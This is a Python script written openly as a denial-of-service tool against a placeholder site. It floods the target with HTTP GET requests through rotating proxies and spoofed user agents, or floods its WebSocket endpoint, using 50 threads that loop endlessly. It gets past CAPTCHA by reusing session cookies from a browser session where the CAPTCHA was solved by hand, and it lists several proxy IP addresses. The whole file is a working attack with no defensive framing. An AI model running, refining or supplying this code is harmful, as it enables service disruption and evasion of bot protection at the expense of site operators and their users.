import requests
import random
import threading
import websocket
from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.chrome.options import Options
from webdriver_manager.chrome import ChromeDriverManager

# Target URLs
HTTP_TARGET = "https://target-site.com"
WEBSOCKET_TARGET = "wss://target-site.com/ws"

# Fake User-Agents
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:45.0)"
]

# List of free proxies (Replace with your own proxy list)
PROXIES = [
    "http://45.77.201.43:3128",
    "http://103.216.82.18:6666",
    "http://190.61.88.147:8080",
    "http://138.201.139.254:3128"
]

# Generate randomized HTTP headers
def generate_headers():
    return {
        "User-Agent": random.choice(USER_AGENTS),
        "Referer": f"https://www.google.com/search?q={random.randint(1, 10000)}",
        "Cache-Control": "no-cache",
        "Pragma": "no-cache"
    }

# Rotate proxies for each request
def get_random_proxy():
    return {"http": random.choice(PROXIES), "https": random.choice(PROXIES)}

# CAPTCHA Bypass using Headless Browser
def bypass_captcha():
    print("🔍 Checking for CAPTCHA...")
    options = Options()
    options.add_argument("--headless")  # Run browser in headless mode
    options.add_argument("--disable-gpu")
    options.add_argument("--no-sandbox")
    driver = webdriver.Chrome(service=Service(ChromeDriverManager().install()), options=options)

    driver.get(HTTP_TARGET)

    # Detect CAPTCHA (Modify this based on CAPTCHA type)
    try:
        captcha_element = driver.find_element("xpath", "//iframe[contains(@src,'captcha')]")
        print(" CAPTCHA Detected! Solving...")

        # Interact with CAPTCHA (Manual step if using headless browsing)
        input("Solve CAPTCHA manually and press Enter...")

        # Get session cookies after CAPTCHA is solved
        cookies = driver.get_cookies()
        session_cookie = {cookie["name"]: cookie["value"] for cookie in cookies}

        print(f" CAPTCHA Solved! Session Cookie: {session_cookie}")
        driver.quit()
        return session_cookie
    except:
        print(" No CAPTCHA detected.")
        driver.quit()
        return None

# Check if WebSockets are supported
def check_websocket_support():
    try:
        ws = websocket.WebSocket()
        ws.connect(WEBSOCKET_TARGET)
        ws.close()
        print(" WebSocket is supported. Using WebSocket flood.")
        return True
    except:
        print(" WebSocket not detected. Switching to HTTP flood.")
        return False

# HTTP GET Flooding with Proxy Rotation
def send_http_request(session_cookie=None):
    while True:
        try:
            headers = generate_headers()
            if session_cookie:
                headers.update(session_cookie)  # Add session cookies to bypass CAPTCHA

            proxy = get_random_proxy()  # Use rotated proxy
            response = requests.get(HTTP_TARGET, headers=headers, proxies=proxy, timeout=5)
            print(f" Sent request through {proxy['http']} | Status: {response.status_code}")
        except requests.exceptions.RequestException:
            pass  # Ignore errors

# WebSocket Flooding
def send_websocket_flood():
    while True:
        try:
            ws = websocket.WebSocket()
            ws.connect(WEBSOCKET_TARGET)
            for _ in range(100):
                message = f"Flood {random.randint(1000, 9999)}"
                ws.send(message)
                print(f" WebSocket Sent: {message}")
            ws.close()
        except Exception as e:
            pass  # Ignore errors

# Start attack with Proxy Rotation and CAPTCHA Bypass
def start_attack(threads=50):
    print(f"🔍 Scanning target {HTTP_TARGET} for vulnerabilities...")

    session_cookie = bypass_captcha()

    if check_websocket_support():
        print(" Launching WebSocket-based attack...")
        for _ in range(threads):
            thread = threading.Thread(target=send_websocket_flood)
            thread.daemon = True
            thread.start()
    else:
        print(" Launching HTTP-based attack with Proxy Rotation...")
        for _ in range(threads):
            thread = threading.Thread(target=send_http_request, args=(session_cookie,))
            thread.daemon = True
            thread.start()

# Run the adaptive attack
start_attack()
